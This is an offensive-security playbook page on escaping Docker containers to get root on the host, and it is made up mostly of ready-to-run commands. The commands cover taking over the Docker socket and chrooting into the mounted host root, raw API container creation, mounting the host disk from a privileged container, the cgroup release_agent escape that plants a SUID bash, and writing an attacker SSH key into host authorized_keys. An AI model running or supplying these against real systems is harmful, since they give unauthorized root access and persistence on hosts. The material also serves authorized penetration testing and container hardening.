---
id: linux-docker-escape
title: Docker Escape
stage: privesc
tags: [linux]
summary: Break out of a Docker container via the socket, privileged mode, or dangerous capabilities — the socket is the most common and gives full daemon control over the host.
leads_to:
  - root-linux
---

## Prerequisites

A shell inside a Docker container. Check with `cat /proc/1/cgroup | grep docker` or `ls /.dockerenv`. One of: accessible `/var/run/docker.sock`, `--privileged` flag set, or `CAP_SYS_ADMIN` capability present.

Docker containers share the host kernel, so privileged access within a container often means privileged access to the host. The docker socket is the biggest risk — it gives full daemon API control, letting you spin up a new container that mounts the host filesystem with no restrictions. Privileged containers have all capabilities and device access, making direct host disk mounting trivial.

## Quick Win

> Check for the docker socket first — if accessible, you own the host in one command.

```bash
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Check if Inside a Container

> Three reliable indicators — any one of these confirms you're in a container.

```bash
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv
hostname   # usually a short hash
```

## Docker Socket Escape

> Full daemon control — mount the host filesystem and chroot to it.

```bash
# Confirm socket access
find / -name docker.sock 2>/dev/null

# Mount host / and chroot — instant root shell on the host
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

If `docker` binary isn't in the container, use the raw API:

```bash
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Mounts":[{"Type":"bind","Source":"/","Target":"/mnt"}],"HostConfig":{"Binds":["/:/mnt"]}}' \
  http://localhost/containers/create
```

## Privileged Container Escape

> All capabilities + device access → mount the host disk and chroot directly.

```bash
# Verify privileged (CapEff = all f's)
cat /proc/self/status | grep CapEff

# Mount host disk
fdisk -l
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash
```

## CAP_SYS_ADMIN Escape (cgroup)

> Use the cgroup notify_on_release mechanism to execute a command on the host.

```bash
capsh --print | grep sys_admin

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" >> /exploit
chmod +x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
/tmp/bash -p
```

## Writable Host Path Mounts

> If sensitive host directories are bind-mounted, write SSH keys or drop SUID binaries.

```bash
mount | grep -v "proc\|sys\|dev\|cgroup"
cat /proc/mounts

# Write authorized_keys to host user home
echo "ssh-rsa ATTACKER_KEY" >> /mnt/host_home/.ssh/authorized_keys

# Or drop SUID binary on host path
cp /bin/bash /mnt/hostpath/bash && chmod +s /mnt/hostpath/bash
```

## Leads To

Socket escape → chroot to host → root on the host machine → root-linux. Privileged container → same. Host filesystem writable → plant SSH key → SSH directly to host as root. After escaping, enumerate other containers and internal services for additional pivot paths.
